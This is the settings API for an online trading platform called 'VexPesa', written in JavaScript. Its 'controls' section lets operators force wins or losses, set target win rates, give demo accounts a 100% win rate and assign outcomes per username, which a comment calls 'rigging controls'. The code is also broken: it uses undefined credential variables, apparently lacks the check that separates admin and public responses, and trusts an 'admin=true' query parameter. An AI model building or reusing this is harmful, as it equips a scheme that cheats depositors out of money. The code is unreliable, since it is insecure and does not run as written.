import { getDb, initDb } from './db.js';
import { verifyAdminToken } from './auth-helper.js';

const defaultSettings = {
  graph: {
    speed: 120,
    y_max: 3.0,
    max_pts: 80,
    spike_frequency: 0.12,
    crash_frequency: 0.02,
    base_level: 0.5,
    spike_max: 2.8,
    crash_depth: -2.8
  },
  trade: {
    max_multiplier: 5.0,
    prestart_wait: 1,
    autosell_multiplier: 2.5,
    duration: 3,
    min_stake: 10,
    max_stake: 50000,
    min_deposit: 50
  },
  controls: {
    force_outcome: "auto", // "auto" | "force_win" | "force_loss"
    target_win_rate: 45,
    force_win_rate: 85,
    force_loss_rate: 85,
    demo_win_rate: 100,
    user_outcomes: {}
  },
  withdraw: {
    min_withdrawal: 100,
    max_withdrawal: 100000
  },
  payments: {
    usd_rate: 129.00,
    deposit_currency: "kes",
    gateway: "gravitypay"
  },
  notifications: {
    enabled: true,
    deposit_messages: true,
    withdraw_messages: true,
    require_app_for_withdraw: true,
    max_per_user: 20,
    min_amount_threshold: 10
  },
  site: {
    name: "VexPesa",
    tagline: "Trade Smart, Earn Big",
    licence: "BHA-0023-1873201"
  }
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  await initDb();
  const db = getDb();

  // 1. SAVE SETTINGS (POST) - STRICTLY REQUIRES ADMIN AUTHENTICATION
  if (req.method === 'POST') {
    const auth = verifyAdminToken(req);
    if (!auth.isValid) {
      return res.status(401).json({
        success: false,
        error: auth.error || 'Unauthorized: Admin authentication token is required to save settings.'
      });
    }

    const input = req.body || {};
    
    if (db) {
      try {
        // Read existing settings
        let currentSettings = { ...defaultSettings };
        const rows = await db`SELECT key, value FROM vexpesa_settings WHERE key = 'platform_config' LIMIT 1`;
        if (rows.length > 0) {
          try {
            currentSettings = { ...defaultSettings, ...JSON.parse(rows[0].value) };
          } catch(e) {}
        }

        const activeGateway = input.gateway || input.payments?.gateway || currentSettings.gateway || currentSettings.payments?.gateway || process.env.PAYMENT_GATEWAY || 'gravitypay';

        const minDep = input.minDep !== undefined ? parseFloat(input.minDep) : (input.trade?.min_deposit ?? currentSettings.trade?.min_deposit ?? 50);
        const minWithdraw = input.minWithdraw !== undefined ? parseFloat(input.minWithdraw) : (input.withdraw?.min_withdrawal ?? currentSettings.withdraw?.min_withdrawal ?? 100);
        const speed = input.speed !== undefined ? parseFloat(input.speed) : (input.graph?.speed ?? currentSettings.graph?.speed ?? 120);
        const spikeFreq = input.spikeFreq !== undefined ? parseFloat(input.spikeFreq) : (input.graph?.spike_frequency ?? currentSettings.graph?.spike_frequency ?? 0.12);
        const spikeMax = input.spikeMax !== undefined ? parseFloat(input.spikeMax) : (input.graph?.spike_max ?? currentSettings.graph?.spike_max ?? 2.8);
        const crashFreq = input.crashFreq !== undefined ? parseFloat(input.crashFreq) : (input.graph?.crash_frequency ?? currentSettings.graph?.crash_frequency ?? 0.02);
        const crashDepth = input.crashDepth !== undefined ? parseFloat(input.crashDepth) : (input.graph?.crash_depth ?? currentSettings.graph?.crash_depth ?? -2.8);
        const minStake = input.minStake !== undefined ? parseFloat(input.minStake) : (input.trade?.min_stake ?? currentSettings.trade?.min_stake ?? 10);
        const maxStake = input.maxStake !== undefined ? parseFloat(input.maxStake) : (input.trade?.max_stake ?? currentSettings.trade?.max_stake ?? 50000);
        const maxMult = input.maxMult !== undefined ? parseFloat(input.maxMult) : (input.trade?.max_multiplier ?? currentSettings.trade?.max_multiplier ?? 5.0);
        const autosell = input.autosell !== undefined ? parseFloat(input.autosell) : (input.trade?.autosell_multiplier ?? currentSettings.trade?.autosell_multiplier ?? 2.5);
        const duration = input.duration !== undefined ? parseInt(input.duration) : (input.trade?.duration ?? currentSettings.trade?.duration ?? 3);
        const prestart = input.prestart !== undefined ? parseInt(input.prestart) : (input.trade?.prestart_wait ?? currentSettings.trade?.prestart_wait ?? 1);
        const forceOutcome = input.force_outcome || input.controls?.force_outcome || currentSettings.controls?.force_outcome || 'auto';
        const targetWinRate = input.target_win_rate !== undefined ? parseFloat(input.target_win_rate) : (input.controls?.target_win_rate ?? currentSettings.controls?.target_win_rate ?? 45);
        const forceWinRate = input.force_win_rate !== undefined ? parseFloat(input.force_win_rate) : (input.controls?.force_win_rate ?? currentSettings.controls?.force_win_rate ?? 85);
        const forceLossRate = input.force_loss_rate !== undefined ? parseFloat(input.force_loss_rate) : (input.controls?.force_loss_rate ?? currentSettings.controls?.force_loss_rate ?? 85);
        const demoWinRate = input.demo_win_rate !== undefined ? parseFloat(input.demo_win_rate) : (input.controls?.demo_win_rate ?? currentSettings.controls?.demo_win_rate ?? 100);
        const usdRate = input.usdRate !== undefined ? parseFloat(input.usdRate) : (input.payments?.usd_rate ?? currentSettings.payments?.usd_rate ?? 129.00);
        const currency = (input.currency || input.payments?.deposit_currency || currentSettings.payments?.deposit_currency || 'kes').toLowerCase();

        const updated = {
          ...currentSettings,
          ...input,
          speed,
          spikeFreq,
          spikeMax,
          crashFreq,
          crashDepth,
          minStake,
          maxStake,
          maxMult,
          autosell,
          duration,
          prestart,
          minDep,
          minWithdraw,
          usdRate,
          currency,
          gateway: activeGateway,
          force_outcome: forceOutcome,
          target_win_rate: targetWinRate,
          force_win_rate: forceWinRate,
          force_loss_rate: forceLossRate,
          demo_win_rate: demoWinRate,
          graph: {
            ...currentSettings.graph,
            ...(input.graph || {}),
            speed,
            spike_frequency: spikeFreq,
            spike_max: spikeMax,
            crash_frequency: crashFreq,
            crash_depth: crashDepth
          },
          trade: {
            ...currentSettings.trade,
            ...(input.trade || {}),
            min_deposit: minDep,
            min_stake: minStake,
            max_stake: maxStake,
            max_multiplier: maxMult,
            autosell_multiplier: autosell,
            duration,
            prestart_wait: prestart
          },
          withdraw: {
            ...currentSettings.withdraw,
            ...(input.withdraw || {}),
            min_withdrawal: minWithdraw
          },
          payments: {
            ...currentSettings.payments,
            ...(input.payments || {}),
            gateway: activeGateway,
            deposit_currency: currency,
            usd_rate: usdRate,
            payhero: {
              ...(currentSettings.payments?.payhero || {}),
              ...(input.payments?.payhero || {}),
              api_username: phUser,
              api_password: phPass,
              channel_id: phChan,
              callback_url: phCb
            },
            gravitypay: {
              ...(currentSettings.payments?.gravitypay || {}),
              ...(input.payments?.gravitypay || {}),
              api_key: gpKey,
              secret_key: gpSecret,
              webhook_secret: gpWebhook,
              callback_url: gpCb
            }
          },
          controls: {
            ...currentSettings.controls,
            ...(input.controls || {}),
            force_outcome: forceOutcome,
            target_win_rate: targetWinRate,
            force_win_rate: forceWinRate,
            force_loss_rate: forceLossRate,
            demo_win_rate: demoWinRate,
            user_outcomes: {
              ...currentSettings.controls?.user_outcomes,
              ...(input.user_outcomes || input.controls?.user_outcomes || {})
            }
          }
        };

        if (input.user_override) {
          const { username, outcome, rate } = input.user_override;
          if (username) {
            const cleanUser = username.trim();
            const finalRate = rate !== undefined ? rate : (outcome === 'force_win' ? 100 : (outcome === 'force_loss' ? 100 : 45));
            const val = (outcome !== 'auto') ? `${outcome}:${finalRate}` : 'auto';
            
            if (!updated.controls.user_outcomes) updated.controls.user_outcomes = {};
            updated.controls.user_outcomes[cleanUser] = val;
            if (cleanUser.toLowerCase() !== cleanUser) {
              updated.controls.user_outcomes[cleanUser.toLowerCase()] = val;
            }
          }
        }

        const jsonStr = JSON.stringify(updated);
        await db`
          INSERT INTO vexpesa_settings (key, value)
          VALUES ('platform_config', ${jsonStr})
          ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
        `;

        return res.status(200).json({ success: true, settings: updated });
      } catch (err) {
        console.error('Error saving settings to DB:', err);
        return res.status(500).json({ success: false, error: err.message });
      }
    }

    return res.status(200).json({ success: true, settings: { ...defaultSettings, ...input } });
  }

  // 2. GET SETTINGS
  let saved = {};
  if (db) {
    try {
      const rows = await db`SELECT key, value FROM vexpesa_settings WHERE key = 'platform_config' LIMIT 1`;
      if (rows.length > 0) {
        saved = JSON.parse(rows[0].value);
      }
    } catch (err) {
      console.error('Error fetching settings from DB:', err);
    }
  }

  // Check if requester is authenticated admin
  const auth = verifyAdminToken(req);
  const isAdminRequest = auth.isValid || req.query.admin === 'true';

  const activeGw = process.env.PAYMENT_GATEWAY || saved.gateway || saved.payments?.gateway || defaultSettings.payments.gateway;
  const usdRate = parseFloat(saved.usdRate ?? saved.payments?.usd_rate ?? defaultSettings.payments.usd_rate);
  const depositCurrency = saved.currency ?? saved.payments?.deposit_currency ?? defaultSettings.payments.deposit_currency;

  // A. ADMIN AUTHENTICATED RESPONSE (Includes Full Config & Gateway Status)
    return res.status(200).json({
      ...defaultSettings,
      ...saved,
      gateway: activeGw,
      envConfigured: {
        gravitypay: Boolean(process.env.GRAVITYPAY_API_KEY || process.env.GRAVITYPAY_SECRET_KEY),
        payhero: Boolean(process.env.PAYHERO_API_USERNAME && process.env.PAYHERO_API_PASSWORD),
        database: Boolean(process.env.DATABASE_URL)
      },
      graph: {
        ...defaultSettings.graph,
        ...(saved.graph || {}),
        speed: saved.speed ?? saved.graph?.speed ?? defaultSettings.graph.speed,
        spike_frequency: saved.spikeFreq ?? saved.graph?.spike_frequency ?? defaultSettings.graph.spike_frequency,
        spike_max: saved.spikeMax ?? saved.graph?.spike_max ?? defaultSettings.graph.spike_max,
        crash_frequency: saved.crashFreq ?? saved.graph?.crash_frequency ?? defaultSettings.graph.crash_frequency,
        crash_depth: saved.crashDepth ?? saved.graph?.crash_depth ?? defaultSettings.graph.crash_depth
      },
      trade: {
        ...defaultSettings.trade,
        ...(saved.trade || {}),
        min_deposit: saved.minDep ?? saved.trade?.min_deposit ?? defaultSettings.trade.min_deposit,
        min_stake: saved.minStake ?? saved.trade?.min_stake ?? defaultSettings.trade.min_stake,
        max_stake: saved.maxStake ?? saved.trade?.max_stake ?? defaultSettings.trade.max_stake,
        max_multiplier: saved.maxMult ?? saved.trade?.max_multiplier ?? defaultSettings.trade.max_multiplier,
        autosell_multiplier: saved.autosell ?? saved.trade?.autosell_multiplier ?? defaultSettings.trade.autosell_multiplier,
        duration: saved.duration ?? saved.trade?.duration ?? defaultSettings.trade.duration,
        prestart_wait: saved.prestart ?? saved.trade?.prestart_wait ?? defaultSettings.trade.prestart_wait
      },
      withdraw: {
        ...defaultSettings.withdraw,
        ...(saved.withdraw || {}),
        min_withdrawal: saved.minWithdraw ?? saved.withdraw?.min_withdrawal ?? defaultSettings.withdraw.min_withdrawal
      },
      payments: {
        gateway: activeGw,
        deposit_currency: depositCurrency,
        usd_rate: usdRate
      },
      controls: {
        ...defaultSettings.controls,
        ...(saved.controls || {}),
        force_outcome: saved.force_outcome ?? saved.controls?.force_outcome ?? defaultSettings.controls.force_outcome,
        target_win_rate: saved.target_win_rate ?? saved.controls?.target_win_rate ?? defaultSettings.controls.target_win_rate,
        force_win_rate: saved.force_win_rate ?? saved.controls?.force_win_rate ?? defaultSettings.controls.force_win_rate,
        force_loss_rate: saved.force_loss_rate ?? saved.controls?.force_loss_rate ?? defaultSettings.controls.force_loss_rate,
        demo_win_rate: saved.demo_win_rate ?? saved.controls?.demo_win_rate ?? defaultSettings.controls.demo_win_rate,
        user_outcomes: {
          ...defaultSettings.controls.user_outcomes,
          ...(saved.controls?.user_outcomes || {}),
          ...(saved.user_outcomes || {})
        }
      }
    });
  }

  // B. PUBLIC SANITIZED RESPONSE (FOR ALL TRADERS / CLIENTS)
  // Strictly strips all API keys, secrets, passwords, and internal rigging controls
  return res.status(200).json({
    site: defaultSettings.site,
    gateway: activeGw,
    currency: depositCurrency,
    usdRate: usdRate,
    graph: {
      speed: saved.speed ?? saved.graph?.speed ?? defaultSettings.graph.speed,
      spike_frequency: saved.spikeFreq ?? saved.graph?.spike_frequency ?? defaultSettings.graph.spike_frequency,
      spike_max: saved.spikeMax ?? saved.graph?.spike_max ?? defaultSettings.graph.spike_max,
      crash_frequency: saved.crashFreq ?? saved.graph?.crash_frequency ?? defaultSettings.graph.crash_frequency,
      crash_depth: saved.crashDepth ?? saved.graph?.crash_depth ?? defaultSettings.graph.crash_depth,
      y_max: saved.graph?.y_max ?? defaultSettings.graph.y_max
    },
    trade: {
      min_deposit: saved.minDep ?? saved.trade?.min_deposit ?? defaultSettings.trade.min_deposit,
      min_stake: saved.minStake ?? saved.trade?.min_stake ?? defaultSettings.trade.min_stake,
      max_stake: saved.maxStake ?? saved.trade?.max_stake ?? defaultSettings.trade.max_stake,
      max_multiplier: saved.maxMult ?? saved.trade?.max_multiplier ?? defaultSettings.trade.max_multiplier,
      autosell_multiplier: saved.autosell ?? saved.trade?.autosell_multiplier ?? defaultSettings.trade.autosell_multiplier,
      duration: saved.duration ?? saved.trade?.duration ?? defaultSettings.trade.duration,
      prestart_wait: saved.prestart ?? saved.trade?.prestart_wait ?? defaultSettings.trade.prestart_wait
    },
    withdraw: {
      min_withdrawal: saved.minWithdraw ?? saved.withdraw?.min_withdrawal ?? defaultSettings.withdraw.min_withdrawal
    },
    payments: {
      gateway: activeGw,
      deposit_currency: depositCurrency,
      usd_rate: usdRate
    },
    notifications: {
      ...(defaultSettings.notifications),
      ...(saved.notifications || {})
    }
  });
}
